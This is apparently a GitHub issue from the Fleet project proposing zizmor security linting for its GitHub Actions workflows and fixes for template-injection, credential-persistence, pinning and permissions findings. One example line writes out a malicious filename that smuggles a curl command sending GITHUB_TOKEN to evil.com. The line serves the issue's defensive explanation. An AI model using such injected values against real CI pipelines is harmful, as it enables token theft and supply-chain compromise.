<!-- **This issue's remaining effort can be completed in ≤1 sprint.  It will be valuable even if nothing else ships.**
It is [planned and ready](https://fleetdm.com/handbook/company/development-groups#making-changes) to implement.  It is on the proper kanban board. -->


## Goal

| User story  |
|:---------------------------------------------------------------------------|
| As a Fleet engineer,
| I want GitHub Actions workflows to be automatically linted for security issues and existing findings to be resolved
| so that I can prevent supply-chain attacks, credential leaks, and code injection in our CI/CD pipelines.

## Context

Running [zizmor](https://github.com/zizmorcore/zizmor) v1.22.0 (a static analysis tool for GitHub Actions from Trail of Bits) against this repo surfaces **450 findings**: 145 errors, 144 warnings, 91 info, and 70 help-level suggestions.

The highest-impact categories are:

| Rule | Errors | Warnings | Description |
|------|--------|----------|-------------|
| template-injection | 87 | 2 | Shell injection via `${{ }}` expansion |
| artipacked | — | 100 | Git credential persistence in artifacts |
| unpinned-uses | 36 | — | Actions pinned to mutable tags instead of SHAs |
| unpinned-images | 33 | — | Docker images without digest pins |
| cache-poisoning | 18 | — | Cache poisoning via `pull_request_target` |
| excessive-permissions | 4 | 18 | Overly broad `permissions` blocks |

### Example 1: Template injection in `code-sign-windows.yml`

```yaml
# BEFORE (vulnerable) — attacker-controlled input interpolated into shell
run: |
  signtool.exe sign /v /debug /sha1 ${{ secrets.DIGICERT_KEYLOCKER_CERTIFICATE_FINGERPRINT }} /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 ${{ inputs.filename }}
  signtool.exe verify /v /pa ${{ inputs.filename }}
```

`inputs.filename` is caller-controlled. GitHub expands `${{ }}` expressions *before* the shell parses the script, so a malicious filename like `foo.exe; curl http://evil.com?t=$GITHUB_TOKEN #` would execute arbitrary commands.

```yaml
# AFTER (safe) — value passed as an environment variable
env:
  FILENAME: ${{ inputs.filename }}
run: |
  signtool.exe sign /v /debug /sha1 "$DIGICERT_FINGERPRINT" /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 "$FILENAME"
  signtool.exe verify /v /pa "$FILENAME"
```

### Example 2: Credential persistence (`artipacked`) across 100+ workflows

Nearly every `actions/checkout` usage omits `persist-credentials: false`, meaning the GITHUB_TOKEN remains stored in `.git/config` for the rest of the job. If any subsequent step uploads an artifact containing `.git/`, the token leaks.

```yaml
# BEFORE
- uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9 # v3.5.3

# AFTER
- uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9 # v3.5.3
  with:
    persist-credentials: false
```

## Changes

### Product
- [ ] UI changes: No changes
- [ ] CLI (fleetctl) usage changes: No changes
- [ ] YAML changes: No changes
- [ ] REST API changes: No changes
- [ ] Fleet's agent (fleetd) changes: No changes
- [ ] Fleet server configuration changes: No changes
- [ ] Exposed, public API endpoint changes: No changes
- [ ] fleetdm.com changes: No changes
- [ ] GitOps mode UI changes: No changes
- [ ] GitOps generation changes: No changes
- [ ] Activity changes: No changes
- [ ] Permissions changes: No changes
- [ ] Changes to paid features or tiers: No changes
- [ ] My device and fleetdm.com/better changes: No changes
- [ ] Usage statistics: No changes
- [ ] Other reference documentation changes: No changes
- [ ] First draft of test plan added
- [ ] Once shipped, requester has been notified
- [ ] Once shipped, dogfooding issue has been filed

### Engineering
- [ ] Add a new CI workflow (e.g., `.github/workflows/zizmor.yml`) that runs `zizmor` on PRs that modify `.github/workflows/**` or `.github/actions/**`
- [ ] Fix all **error**-level template-injection findings (87) by moving `${{ }}` expressions to `env:` blocks
- [ ] Fix all **error**-level unpinned-uses findings (36) by pinning actions to full commit SHAs
- [ ] Fix all **error**-level unpinned-images findings (33) by pinning container images to digests
- [ ] Fix all **error**-level cache-poisoning findings (18)
- [ ] Fix all **error**-level excessive-permissions findings (4) by adding explicit `permissions` blocks
- [ ] Fix **warning**-level artipacked findings (100) by adding `persist-credentials: false` to checkout steps
- [ ] Fix **warning**-level excessive-permissions findings (18)
- [ ] Fix **warning**-level secrets-inherit findings (5) by passing only required secrets
- [ ] Test plan is finalized
- [ ] Contributor API changes: No changes
- [ ] Feature guide changes: No changes
- [ ] Database schema migrations: No changes
- [ ] Load testing: No changes
- [ ] Pre-QA load test: No changes
- [ ] Load testing/osquery-perf improvements: No changes
- [ ] This is a premium only feature: No

> ℹ️  Please read this issue carefully and understand it.  Pay [special attention](https://fleetdm.com/handbook/company/development-groups#developing-from-wireframes) to UI wireframes, especially "dev notes".

### Risk assessment

- Risk level: Low
- Most fixes are mechanical (env var extraction, adding `persist-credentials: false`, pinning SHAs). The new CI workflow is additive and non-blocking by default.

### Test plan

- [ ] Verify `zizmor` CI workflow triggers on PRs that modify `.github/workflows/**` or `.github/actions/**`
- [ ] Verify `zizmor` CI workflow does NOT trigger on PRs that only modify non-workflow files
- [ ] Run `zizmor --no-online-audits .` locally and confirm zero error-level findings after fixes
- [ ] Run `zizmor --no-online-audits .` locally and confirm zero warning-level findings after fixes
- [ ] Spot-check that fixed workflows still function correctly (e.g., code signing, deploys, goreleaser)

### Testing notes
zizmor can be installed via `pip install zizmor` and run with `zizmor --no-online-audits .` from the repo root. Use `--format json` for machine-readable output.

### Confirmation

1. [ ] Engineer: Added comment to user story confirming successful completion of test plan.
2. [ ] QA: Added comment to user story confirming successful completion of test plan.
